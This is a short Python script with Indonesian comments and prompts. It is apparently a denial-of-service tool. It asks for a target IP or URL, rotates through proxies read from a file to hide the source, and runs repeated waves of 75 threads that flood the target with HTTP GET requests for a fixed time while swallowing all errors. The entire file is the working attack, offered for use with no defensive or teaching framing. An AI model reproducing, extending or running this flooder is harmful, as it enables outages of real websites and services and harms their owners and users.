import threading
import requests
import time
import random

# Load proxy list (jika ada)
try:
    with open("proxy.txt", "r") as f:
        proxies = f.read().splitlines()
except:
    proxies = []

def attack(target):
    try:
        proxy = random.choice(proxies) if proxies else None
        proxies_dict = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}",
        } if proxy else None

        headers = {
            "User-Agent": "Mozilla/5.0",
        }

        requests.get(target, headers=headers, proxies=proxies_dict, timeout=3)
    except:
        pass  # biar gak spam error

def run_attack(target, threads=75, duration=10):
    print(f"\nSedang proses menyerang {target}...\n")
    start = time.time()
    while time.time() - start < duration:
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=attack, args=(target,))
            t.start()
            thread_list.append(t)
        for t in thread_list:
            t.join()
    print("\nSelesai mengirim serangan.")

if __name__ == "__main__":
    target = input("Masukkan IP/URL target (contoh: 123.45.67.89): ")
    run_attack(target)